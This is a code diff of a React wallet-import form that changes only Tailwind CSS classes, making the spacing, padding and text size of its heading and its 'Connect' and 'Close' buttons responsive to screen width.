@@ -34,7 +34,7 @@ function Form() {
           </span>
           <span>Import your wallet</span>
         </p>
-        <p className="flex gap-8 border-b border-b-gray-200 text-xl font-bold">
+        <p className="flex gap-4 border-b border-b-gray-200 font-bold md:gap-8 md:text-xl">
           <span
             className={`${
               active === 1
@@ -125,11 +125,11 @@ function Form() {
             <input
               type="submit"
               value="Connect"
-              className="mx-auto block w-[70%] cursor-pointer rounded bg-blue-500 px-[30px] py-[15px] text-center text-white "
+              className="mx-auto block w-[70%] cursor-pointer rounded bg-blue-500 py-2 text-center text-white md:px-4 md:pt-3 "
             />
             <p
               onClick={() => setFormVisible(false)}
-              className=" w-[30%] cursor-pointer rounded bg-red-500 px-4 pt-3 text-center text-white "
+              className=" w-[30%] cursor-pointer rounded bg-red-500 py-2 text-center text-white md:px-4 md:pt-3 "
             >
               Close
             </p>
